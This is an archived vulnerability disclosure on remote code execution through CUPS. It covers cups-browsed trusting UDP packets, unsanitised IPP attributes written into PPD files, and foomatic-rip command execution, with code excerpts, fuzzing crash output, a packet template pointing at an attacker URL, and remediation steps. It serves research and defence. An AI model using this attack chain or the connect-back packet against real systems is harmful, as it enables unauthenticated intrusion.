---
url: "https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/"
title: "Attacking UNIX Systems via CUPS, Part I | evilsocket"
site: "evilsocket"
captured: "2026-11-02T18:53:41Z"
via: "live"
sha256: "b1e33e6c93f198dde63703242b70a6d55c107edc42466deff1a046c3744e0130"
wayback: "https://web.archive.org/web/20261002210504/https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/"
cited_in:
  - "docs/threats/07-network-exposure-and-remote-access.md"
---

# Attacking UNIX Systems via CUPS, Part I | evilsocket

> Archived copy of a third-party page, kept so Bigman's findings survive if the original goes away. Copyright stays with the original publisher; cite the original URL.
>
> Original: <https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/>
> Snapshot: <https://web.archive.org/web/20261002210504/https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/>

# Attacking UNIX Systems via CUPS, Part I

BY Simone Margaritelli — 26 Sep 2024 — [cups](https://www.evilsocket.net/tags/cups/), [cups-browsed](https://www.evilsocket.net/tags/cups-browsed/), [printer](https://www.evilsocket.net/tags/printer/), [printing](https://www.evilsocket.net/tags/printing/), [unix](https://www.evilsocket.net/tags/unix/), [hacking](https://www.evilsocket.net/tags/hacking/), [rce](https://www.evilsocket.net/tags/rce/), [disclosure](https://www.evilsocket.net/tags/disclosure/), [exploit](https://www.evilsocket.net/tags/exploit/), [ipp](https://www.evilsocket.net/tags/ipp/), [zeroconf](https://www.evilsocket.net/tags/zeroconf/), [udp](https://www.evilsocket.net/tags/udp/), [responsible disclosure](https://www.evilsocket.net/tags/responsible-disclosure/), [vulnerability research](https://www.evilsocket.net/tags/vulnerability-research/), [linux security](https://www.evilsocket.net/tags/linux-security/), [print services](https://www.evilsocket.net/tags/print-services/), [unauthenticated access](https://www.evilsocket.net/tags/unauthenticated-access/), [cve](https://www.evilsocket.net/tags/cve/), [CVE-2024-47176](https://www.evilsocket.net/tags/CVE-2024-47176/), [CVE-2024-47076](https://www.evilsocket.net/tags/CVE-2024-47076/), [CVE-2024-47175](https://www.evilsocket.net/tags/CVE-2024-47175/), [CVE-2024-47177](https://www.evilsocket.net/tags/CVE-2024-47177/)

[Follow me on X](https://twitter.com/evilsocket)

Hello friends, this is the first of two, possibly three (if and when I have time to finish the Windows research) writeups. We will start with targeting GNU/Linux systems with an RCE. As someone who’s directly involved in the CUPS project said:

From a generic security point of view, a whole Linux system as it is nowadays is just an endless and hopeless mess of security holes waiting to be exploited.

Well they’re not wrong!

While this is [not](https://www.huawei.com/en/psirt/security-advisories/hw-425408) the [first](https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/) time [I try](https://www.evilsocket.net/2017/05/30/Terramaster-NAS-Unauthenticated-RCE-as-root/) to more or less responsibly report a vulnerability, it is definitely the weirdest and most frustrating time as some of you might have noticed from my socials, and it is also the last time. More on this later, but first.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#SummarySummary

- CVE-2024-47176 | cups-browsed <= 2.0.1 binds on UDP INADDR_ANY:631 trusting any packet from any source to trigger a Get-Printer-Attributes IPP request to an attacker controlled URL.
- CVE-2024-47076 | libcupsfilters <= 2.1b1 cfGetPrinterAttributes5 does not validate or sanitize the IPP attributes returned from an IPP server, providing attacker controlled data to the rest of the CUPS system.
- CVE-2024-47175 | libppd <= 2.1b1 ppdCreatePPDFromIPP2 does not validate or sanitize the IPP attributes when writing them to a temporary PPD file, allowing the injection of attacker controlled data in the resulting PPD.
- CVE-2024-47177 | cups-filters <= 2.0.1 foomatic-rip allows arbitrary command execution via the FoomaticRIPCommandLine PPD parameter.

(can you already see where this is going? :D)

Plus a couple of other bugs that will be mentioned and that are arguably security issues but have been pretty much ignored during the conversation with the developers and the CERT. They are still there, along with several other bugs that are more or less exploitable.

### https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#ImpactImpact

A remote unauthenticated attacker can silently replace existing printers’ (or install new ones) IPP urls with a malicious one, resulting in arbitrary command execution (on the computer) when a print job is started (from that computer).

### https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Entry-PointsEntry Points

- WAN / public internet: a remote attacker sends an UDP packet to port 631. No authentication whatsoever.
- LAN: a local attacker can spoof zeroconf / mDNS / DNS-SD advertisements (we will talk more about this in the next writeup ) and achieve the same code path leading to RCE.

Quoting one of the first comments from the guy who literally wrote the book about CUPS, while trying to explain to me why this is not that bad:

I am just pointing out that the public Internet attack is limited to servers that are directly connected to the Internet

### https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Affected-SystemsAffected Systems

CUPS and specifically cups-browsed are packaged for most UNIX systems:

- most [GNU/Linux distributions](https://pkgs.org/download/cups-browsed)
- [some](https://docs.freebsd.org/en/articles/cups/) BSDs.
- Google [Chromium / ChromeOS](https://source.chromium.org/chromiumos/chromiumos/codesearch/+/main:src/third_party/chromiumos-overlay/net-print/;bpv=1) … [maybe?](https://issuetracker.google.com/issues/172222838)
- Oracle [Solaris](https://docs.oracle.com/cd/E23824_01/html/821-1451/cups-intro.html)
- Possibly more?

This thing is packaged for anything, in some cases it’s enabled by default, in others it’s not, go figure. Full disclosure, I’ve been scanning the entire public internet IPv4 ranges several times a day for weeks, sending the UDP packet and logging whatever connected back. And I’ve got back connections from hundreds of thousands of devices, with [peaks of 200-300K concurrent clients](https://x.com/evilsocket/status/1833878573289025664). [This file](https://pastebin.com/7zzFzxCN) contains a list of the unique Linux systems affected. Note that everything that is not Linux has been filtered out. That is why I was getting increasingly alarmed during the last few weeks.

### https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#RemediationRemediation

- Disable and remove the cups-browsed service if you don’t need it (and probably you don’t).
- Update the CUPS package on your systems.
- In case your system can’t be updated and for some reason you rely on this service, block all traffic to UDP port 631 and possibly all DNS-SD traffic (good luck if you use zeroconf).

Entirely personal recommendation, take it or leave it: I’ve seen and attacked enough of this codebase to remove any CUPS service, binary and library from any of my systems and never again use a UNIX system to print. I’m also removing every zeroconf / avahi / bonjour listener. You might consider doing the same.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#IntroIntro

One lazy day a few weeks ago, I was configuring Ubuntu on a new laptop (GPD Pocket 3, amazing little hacking machine btw) and for reasons that are irrelevant to this post I wanted to check which services were listening on UDP ports - so I type netstat -anu in a terminal and after checking the output, I notice something interesting:

|

```
1
2
3
4

```

|

```
Proto Recv-Q Send-Q Local Address           Foreign Address         State
...
udp        0      0 0.0.0.0:631             0.0.0.0:*
...

```

The 0.0.0.0 part is especially unusual, it means that whatever process is listening on port 631, it is listening on and responding to any network interface: LAN, WAN, VPN, whatever you have. I also vaguely recalled that [CUPS, the Common Unix Printing System](https://en.wikipedia.org/wiki/CUPS), uses TCP port 631, but this is UDP. I investigated with a lsof -i :631, that confirmed CUPS on 631 tcp plus this other process, cups-browsed (likely related to CUPS), using the udp port instead:

|

```
1
2
3

```

|

```
cupsd     1868642 root    6u  IPv6 32034095      0t0  TCP ip6-localhost:ipp (LISTEN)
cupsd     1868642 root    8u  IPv4 32034096      0t0  TCP localhost:ipp (LISTEN)
cups-brow 1868652 root    7u  IPv4 32024370      0t0  UDP *:631

```

And ps aux | grep "cups-brow" ultimately confirmed that this process runs as root:

|

```
1

```

|

```
root     1868652  0.0  0.0 172692 11196 ?        Ssl  13:20   0:00 /usr/sbin/cups-browsed

```

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#What-is-cups-browsedWhat is cups-browsed?

After some googling I found out that cups-browsed is indeed part of the CUPS system and it is responsible for discovering new printers and automatically adding them to the system. Very interesting, I had no idea Linux just added anything found on a network before the user can even accept or be notified. The more you know!

At this point I was extremely intrigued and curious, so I start digging into the [source code of this service](https://github.com/OpenPrinting/cups-browsed). While it’s pretty messy on one hand, it is also self contained and relatively easy to understand. So I quickly search for [bind API](https://man7.org/linux/man-pages/man2/bind.2.html) usage and [confirm](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L13995) that this thing is indeed listening on INADDR_ANY:631 UDP:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14

```

|

```
...
struct sockaddr_in addr;
memset (&addr, 0, sizeof (addr));
addr.sin_addr.s_addr = htonl (INADDR_ANY);
addr.sin_family = AF_INET;
addr.sin_port = htons (BrowsePort);
if (bind (browsesocket, (struct sockaddr *)&addr, sizeof (addr)))
{
    debug_printf("failed to bind CUPS Browsing socket: %s\n",
        strerror (errno));
    close (browsesocket);
    browsesocket = -1;
}
...

```

Cool, this code is using global variables like there’s no tomorrow, so searching for the browsesocket [revealed](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11819) that the process_browse_data function is reading a packet from it, performing some checks and then some parsing:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19

```

|

```
got = recvfrom (browsesocket, packet, sizeof (packet) - 1, 0,
        &srcaddr.addr, &srclen);

// ... error checking removed for brevity ...

packet[got] = '\0';
httpAddrString (&srcaddr, remote_host, sizeof (remote_host) - 1);

// Check this packet is allowed
if (!allowed ((struct sockaddr *) &srcaddr))
{
    debug_printf("browse packet from %s disallowed\n",
            remote_host);
    return (TRUE);
}

// debug loggig removed for brevity

if (sscanf (packet, "%x%x%1023s", &type, &state, uri) < 3)

```

Essentially, this service expects an UDP packet with the format HEX_NUMBER HEX_NUMBER TEXT_DATA and, if the allowed function returns true for the specific source IP, more things happen later.

Well it turns out that while you could configure who can and who can’t connect by editing the /etc/cups/cups-browsed.conf configuration file … the default configuration file, on pretty much any system, is entirely commented out and simply allows anyone.

Great.

Later in the code, some [pointer operations are performed to parse the packet](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11857). If all checks pass, two text fields parsed from the packet are passed to the found_cups_printer function. We’ll return to this function in a moment, but for now let’s focus on the parsing.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Stack-Buffer-Overflows-and-Race-ConditionsStack Buffer Overflows and Race Conditions

Keep in mind that while the CUPS package itself [is covered in oss-fuzz](https://github.com/google/oss-fuzz/tree/master/projects/cups) (barely to be honest …), cups-browsed is not; there seems to be no fuzzing coverage for this component. And I don’t know about you, but to me this parsing routine looks fishy and definitely something worth fuzzing:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45

```

|

```
end = packet + sizeof(packet);
c = strchr (packet, '\"');
if (c >= end)
    return (TRUE);

if (c)
{
    // Extract location field
    {
        int i;
        c++;
        for (i = 0;
             i < sizeof (location) - 1 && *c != '\"' && c < end;
             i++, c++)
                location[i] = *c;
        location[i] = '\0';
        debug_printf("process_browse_data: location: |%s|\n", location); // !!
    }
    for (; c < end && *c != '\"'; c++);

    if (c >= end)
        return (TRUE);

    if (*c == '\"')
        for (c++; c < end && isspace(*c); c++);

    if (c >= end)
        return (TRUE);

    // Is there an info field?
    if (*c == '\"')
    {
        int i;
        c++;
        for (i = 0;
             i < sizeof (info) - 1 && *c != '\"' && c < end;
             i++, c++)
            info[i] = *c;
        info[i] = '\0';
        debug_printf("process_browse_data: info: |%s|\n", info); // !!
    }
}

if (c >= end)
    return (TRUE);

```

So I quickly put together a fuzzing target around process_browse_data, start my [good old friend AFL](https://www.evilsocket.net/2015/04/30/Fuzzing-with-AFL-Fuzz-a-Practical-Example-AFL-vs-binutils/), and wait. You won’t believe what happens next!!!

There are 5 different fuzzing inputs that trigger this:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62

```

|

```
process_browse_data() in THREAD 136077340691200
got= 1135
httpAddrGetString(addr=0x7bc2f7f098a0, s=0x7bc2f7f09a00, slen=255)
1httpAddrGetString: returning "UNKNOWN"...
browse packet received from UNKNOWN
process_browse_data: location: |IIIIIIII???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????@???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????|
---
==28780==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7bc2f7f09820 at pc 0x58293fb0926b bp 0x7fffa0308490 sp 0x7fffa0308488
READ of size 1 at 0x7bc2f7f09820 thread T0
    #0 0x58293fb0926a in process_browse_data(char const*) /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:264:42
    #1 0x58293fb093d6 in main /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:292:9
    #2 0x7bc2fa42a1c9 in __libc_start_call_main csu/../sysdeps/nptl/libc_start_call_main.h:58:16
    #3 0x7bc2fa42a28a in __libc_start_main csu/../csu/libc-start.c:360:3
    #4 0x58293fa293e4 in _start (/home/evilsocket/lab/cups-fuzz/process_browse_data/fuzz-target+0x2d3e4) (BuildId: a6df1903658bcb123c38a4a928f80e2a81b617e1)

Address 0x7bc2f7f09820 is located in stack of thread T0 at offset 2080 in frame
    #0 0x58293fb08557 in process_browse_data(char const*) /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:164

  This frame has 8 object(s):
    [32, 2080) 'packet' (line 165) <== Memory access at offset 2080 overflows this variable
    [2208, 2464) 'srcaddr' (line 166)
    [2528, 2532) 'type' (line 169)
    [2544, 2548) 'state' (line 170)
    [2560, 2816) 'remote_host' (line 171)
    [2880, 3904) 'uri' (line 172)
    [4032, 5056) 'location' (line 173)
    [5184, 6208) 'info' (line 174)
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow /home/evilsocket/lab/cups-fuzz/process_browse_data/main.cpp:264:42 in process_browse_data(char const*)
Shadow bytes around the buggy address:
  0x7bc2f7f09580: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7bc2f7f09600: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7bc2f7f09680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7bc2f7f09700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7bc2f7f09780: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7bc2f7f09800: 00 00 00 00[f2]f2 f2 f2 f2 f2 f2 f2 f2 f2 f2 f2
  0x7bc2f7f09880: f2 f2 f2 f2 00 00 00 00 00 00 00 00 00 00 00 00
  0x7bc2f7f09900: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7bc2f7f09980: 00 00 00 00 f2 f2 f2 f2 f2 f2 f2 f2 04 f2 04 f2
  0x7bc2f7f09a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7bc2f7f09a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==28780==ABORTING

```

I believe it being due to the pointer being dereferenced before the exit condition is verified, in both loops. I also found out later on that there’s a race condition and possibly DoS in the [lock acquired here](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11764).

Both these issues [have been reported and thoroughly documented](https://github.com/OpenPrinting/cups-browsed/security/advisories/GHSA-rj88-6mr5-rcw8#advisory-comment-109538), to the devs and the CERT, but nobody seemed to give a damn. I can tell you that there’re other, more easily exploitable code paths going on, not just in the discovery mechanism - also reported and ignored. To this day they have not been acknowledged or patched. Happy hunting.

However, I’m a bit lazy and most importantly I’m a noob when it comes to binary exploitation. Hell, I can barely tell whether a buffer overflow or a race condition are exploitable or not. Hardening mechanisms are getting more and more complex to bypass and to be honest I had no intention of spending months on this stuff - I hate printers. So for the moment I decided to move on to what seemed to be a lower hanging fruit.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Back-to-found-cups-printerBack to found_cups_printer

By looking at [found_cups_printer](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L11686C1-L11720C36) we can see that one of the two text fields parsed from the packet is a URL:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18

```

|

```
//
// A CUPS printer has been discovered via CUPS Browsing
// or with BrowsePoll
//
static void
found_cups_printer(const char *remote_host,
		   const char *uri,
		   const char *location,
		   const char *info)
{
  // ... initialization skipped ...

  httpSeparateURI(HTTP_URI_CODING_ALL, uri,
		  scheme, sizeof(scheme) - 1,
		  username, sizeof(username) - 1,
		  host, sizeof(host) - 1,
		  &port,
		  resource, sizeof(resource)- 1);

```

After some further validation and parsing, this URL and other data are then passed as arguments to the [examine_discovered_printer_record function](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L10211), which ultimately executes [create_remote_printer_entry](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L7644). The create_remote_printer_entry function will then call [cfGetPrinterAttributes](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L7828) from libcupsfilters:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16

```

|

```
// For a remote CUPS printer our local queue will be raw or get a
// PPD file from the remote CUPS server, so that the driver on the
// remote CUPS server gets used. So we will not generate a PPD file
// or interface script at this point.
p->netprinter = 0;
if (p->uri[0] != '\0')
{
    p->prattrs = cfGetPrinterAttributes(p->uri, NULL, 0, NULL, 0, 1);
    debug_log_out(cf_get_printer_attributes_log);
    if (p->prattrs == NULL)
    {
        debug_printf("get-printer-attributes IPP call failed on printer %s (%s).\n",
            p->queue_name, p->uri);
        goto fail;
    }
}

```

To understand what this means, we’ll need to briefly mention what the IPP protocol is, but for now the key points are:

- A packet containing any URL, in the form of 0 3 http://<ATTACKER-IP>:<PORT>/printers/whatever, gets to UDP port 631
- This triggers a sequence of events that result in cups-browsed connecting to that URL, a drive-by kind of thing.

So I tell to myself: there’s no freaking way that if I send this packet to a public IP running CUPS (thank you shodan.io), that computer will connect back to the server I specified. No way.

I hack some python code together, fire up a VPS and try anyway.

HOLY SH!!!!! Not only it connected back immediately, but it also reported the exact kernel version and architecture in the User-Agent header! We’ll see later how this protocol also reports the requesting username (on the target) for some requests. Also this aspect, that to me [matches pretty well with CWE-200](https://cwe.mitre.org/data/definitions/200.html), has been reported and just scoffed off as part of the mechanism. Alright … let’s not waste time on arguing whether or not this is a problem, let’s get to the juicy stuff. We know that this thing talks HTTP and POSTs some semi binary payload, what the hell is that?

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#Internet-Printing-ProtocolInternet Printing Protocol

The [Internet Printing Protocol](https://en.wikipedia.org/wiki/Internet_Printing_Protocol), in short IPP, is a specialized communication protocol for communication between client devices (computers, mobile phones, tablets, etc.) and printers (or print servers). It allows clients to submit one or more print jobs to the network-attached printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or cancelling individual print jobs.

Essentially, the system now believes that we are a printer and it is sending us, encapsulated in HTTP, a [Get-Printer-Attributes](https://ftp.pwg.org/pub/pwg/ipp/registrations/reg-ippgupa-20171214.pdf) request in order to fetch printer attributes such as the model, vendor and several others. It makes sense, the system discovered a new printer and somehow it has to know what it is. Well …

I went back to writing some code and, by using the [ippserver python package](https://github.com/h2g2bob/ipp-server) I was now able to respond properly, with attributes I controlled, to the service request. My fake printer was immediately added to the local printers with no notification whatsoever to the user.

AMAZING!

What can we do with this? At this point I enabled debug logs in the service so I could observe what was going on when my fake printer was being discovered and added, and noticed these lines:

|

```
1
2
3
4
5
6
7
8
9
10
11

```

|

```
...
Wed Sep  4 13:15:32 2024 127517144909504 Creating permanent CUPS queue God_192_168_50_19.
Wed Sep  4 13:15:32 2024 127517144909504 Loading saved printer options for God_192_168_50_19 from /var/cache/cups-browsed/cups-browsed-options-God_192_168_50_19
Wed Sep  4 13:15:32 2024 127517144909504 Failed reading file /var/cache/cups-browsed/cups-browsed-options-God_192_168_50_19, probably no options recorded yet
Wed Sep  4 13:15:32 2024 127517144909504 Print queue God_192_168_50_19 is for remote CUPS queue(s) and we get notifications from CUPS, using implicit class device URI implicitclass://God_192_168_50_19/
Wed Sep  4 13:15:32 2024 127517144909504 PPD generation successful: PDF PPD generated.
Wed Sep  4 13:15:32 2024 127517144909504 Created temporary PPD file: /tmp/00f9466d902dc
Wed Sep  4 13:15:32 2024 127517144909504 Using PPD /tmp/00f9466d902dc for queue God_192_168_50_19.
Wed Sep  4 13:15:32 2024 127517144909504 Editing PPD file /tmp/00f9466d902dc for printer God_192_168_50_19, setting the option defaults of the previous cups-browsed session and doing client-side filtering of the job, saving the resulting PPD in /tmp/00f9466d9231e.
Wed Sep  4 13:15:32 2024 127517144909504 Non-raw queue God_192_168_50_19 with PPD file: /tmp/00f9466d9231e
...

```

Wait what?! It looks like the service fetches these attributes and then creates some sort of temporary file, a “PPD”, on which these attributes are possibly saved.

If we search for the PPD generation successful string that appears in the logs, we find ourselves in the [create_queue function](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L8622-L8650), where we can see how the attributes are passed to the ppdCreatePPDFromIPP2 API in libppd:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29

```

|

```
// If we do not want CUPS-generated PPDs or we cannot obtain a
// CUPS-generated PPD, for example if CUPS does not create a
// temporary queue for this printer, we generate a PPD by
// ourselves
printer_ipp_response = (num_cluster_printers == 1) ? p->prattrs :
printer_attributes;
if (!ppdCreatePPDFromIPP2(ppdname, sizeof(ppdname), printer_ipp_response,
        make_model,
        pdl, color, duplex, conflicts, sizes,
        default_pagesize, default_color,
        ppdgenerator_msg, sizeof(ppdgenerator_msg)))
{
    if (errno != 0)
        debug_printf("Unable to create PPD file: %s\n",
            strerror(errno));
    else
        debug_printf("Unable to create PPD file: %s\n",
            ppdgenerator_msg);
    p->status = STATUS_DISAPPEARED;
    current_time = time(NULL);
    p->timeout = current_time + TIMEOUT_IMMEDIATELY;
    goto end;
}
else
{
    debug_printf("PPD generation successful: %s\n", ppdgenerator_msg);
    debug_printf("Created temporary PPD file: %s\n", ppdname);
    ppdfile = strdup(ppdname);
}

```

We finally get to libppd, where the [ppdCreatePPDFromIPP2 API](https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L182) is used to [save some of those attacker controlled text attributes](https://github.com/OpenPrinting/libppd/blob/0d90320157135b9ec585617e1545793b274c7f82/ppd/ppd-generator.c#L353) to a file with a very specific, line oriented syntax, without any sanitization whatsoever:

|

```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25

```

|

```
if ((attr = ippFindAttribute(supported, "printer-make-and-model",
			       IPP_TAG_TEXT)) != NULL)
    strlcpy(make, ippGetString(attr, 0, NULL), sizeof(make));
  else if (make_model && make_model[0] != '\0')
    strlcpy(make, make_model, sizeof(make));
  else
    strlcpy(make, "Unknown Printer", sizeof(make));

  if (!strncasecmp(make, "Hewlett Packard ", 16) ||
      !strncasecmp(make, "Hewlett-Packard ", 16))
  {
    model = make + 16;
    strlcpy(make, "HP", sizeof(make));
  }
  else if ((model = strchr(make, ' ')) != NULL)
    *model++ = '\0';
  else
    model = make;

  cupsFilePrintf(fp, "*Manufacturer: \"%s\"\n", make);             // <--- LOL
  cupsFilePrintf(fp, "*ModelName: \"%s %s\"\n", make, model);      // <--- LOL
  cupsFilePrintf(fp, "*Product: \"(%s %s)\"\n", make, model);      // <--- LOL
  cupsFilePrintf(fp, "*NickName: \"%s %s, %sdriverless, %s\"\n",
		 make, model, (is_fax ? "Fax, " : ""), VERSION);
  cupsFilePrintf(fp, "*ShortNickName: \"%s %s\"\n", make, model);  // <--- LOL

```

Notice how many attributes are fprintf’ed, unescaped, into the file. The printer-make-and-model is just one of them. So, what the hell is a PPD file now?

NOTE: These two API are also used in other parts of the overall CUPS system, not just the discovery. IYKWIM.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#PostScript-Printer-DescriptionPostScript Printer Description

[PostScript Printer Description (PPD)](https://en.wikipedia.org/wiki/PostScript_Printer_Description) files are created by vendors to describe the entire set of features and capabilities available for their PostScript printers.
A PPD also contains the PostScript code (commands) used to invoke features for the print job. As such, PPDs function as drivers for all PostScript printers, by providing a unified interface for the printer’s capabilities and features.

So a PPD file is a text file provided by a vendor that describes in a domain specific language the printer capabilities to CUPS and instructs it on how to use it properly. It looks something like this:

|

```
1
2
3
4
5
6
7
8
9

```

|

```
*% =================================
*% Basic Device Capabilities
*% =================================
*LanguageLevel: "2"
*ColorDevice: True
*DefaultColorSpace: CMYK
*TTRasterizer: Type42
*FileSystem: False
*Throughput: "10"

```

And there are tons of different instructions that are supported and can be used to do all sorts of things. I spent a few hours [just reading the PPD specs](https://web.mit.edu/PostScript/Adobe/Documents/5003.PPD_Spec_v4.3.pdf) (thank you MIT), and studying the [CUPS specific extensions](https://www.cups.org/doc/spec-ppd.html) in order to find something I could rely to perform an attack. And then I found about the cupsFilter2 directive:

A filter is any executable contained in the /usr/lib/cups/filter path (CUPS does check this, you can’t specify any binary), which will get executed when a print job is sent to the printer, in order to perform some document conversion if the printer doesn’t support that specific format. So, given that we have a constraint on which binary we can execute, we need to find a way to leverage one of the existing filters to run arbitrary commands. And also bypass [these checks here](https://github.com/OpenPrinting/cups-browsed/blob/c12b9cf5a906ab16971f5d060f291f9a58edadac/daemon/cups-browsed.c#L8939), which only takes a space before the colon.

## https://www.evilsocket.net/2024/09/26/Attacking-UNIX-systems-via-CUPS-Part-I/#The-problematic-child-foomatic-ripThe problematic child: foomatic-rip

Another search revealed pretty quickly what could be defined as the necessary evil of the CUPS family, the [foomatic-rip filter](https://linux.die.net/man/1/foomatic-rip). This executable has a long history of being leveraged for exploitation, starting from the first known (to me at least) [CVE-2011-2964](https://nvd.nist.gov/vuln/detail/CVE-2011-2964) and [CVE-2011-2697](https://nvd.nist.gov/vuln/detail/CVE-2011-2697) back in 2011. The filter accepted the FoomaticRIPCommandLine directive in the PPD that would allow ANY command to be executed through it. Nice!

According to the records, [this is the commit](https://github.com/Distrotech/foomatic-filters/commit/20f05ab502d9e7a5bef58de16eca82d3745a7ad9) that fixed those CVEs. However, you might have noticed that this package is different and it’s called foomatic-filters. When [foomatic-filters was integrated in the CUPS system](https://unix.stackexchange.com/questions/378557/what-is-the-difference-between-cups-filters-and-foomatic-filters), this fix was not ported to CUPS, as it is possible to verify by the --ppd argument, initially removed as part of the fix, and [still present in the code today](https://github.com/OpenPrinting/cups-filters/blob/90f04657ad3cac36ca1bfa96f62f3878166bc8f6/filter/foomatic-rip/foomaticrip.c#L983). And in fact, we can find mentions of the FoomaticRIPCommandLine directive being leveraged for arbitrary command execution in the more recent [CVE-2024-35235](https://nvd.nist.gov/vuln/detail/CVE-2024-35235).

So apparently foomatic-rip was a known issue (confirmed by the CUPS devs), but somehow it has not been fixed for … decades? Why is something that allows arbitrary commands in a generally untrusted context not considered a security issue worth fixing? I’ll tell you why! Because it’s very hard to fix. According to the CUPS developers:

… it is very difficult to limit what can be provided in the FoomaticRIPCommandLine line in the PPD file. REDACTED and the rest of the OpenPrinting team have been talking about ways to limit what can be done through Foomatic without breaking existing drivers - we can certainly recommend that people not use Foomatic, but there are likely hundreds of older printer models (before 2010) that are only supported through Foomatic.

And many of those hundreds of models, really use this directive [in creative ways](https://github.com/search?q=repo:OpenPrinting/foomatic-db%20foomaticripcommandline&type=code) such as:

|

```
1
2
3

```

|

```
*FoomaticRIPCommandLine: "(printf &apos;\033%%-12345X@PJL\n@PJL JOB\n@PJL SET COPIES=&copies;\n&apos;%G|perl -p -e "s/\x26copies\x3b/1/");
(gs -q -dBATCH -dPARANOIDSAFER -dNOPAUSE -dNOINTERPOLATE %B%A%C %D%E | perl -p -e "s/^\x1b\x25-12345X//" | perl -p -e "s/\xc1\x01\x00\xf8\x31\x44/\x44/g");
(printf &apos;@PJL\n@PJL EOJ\n\033%%-12345X&apos;)"

```

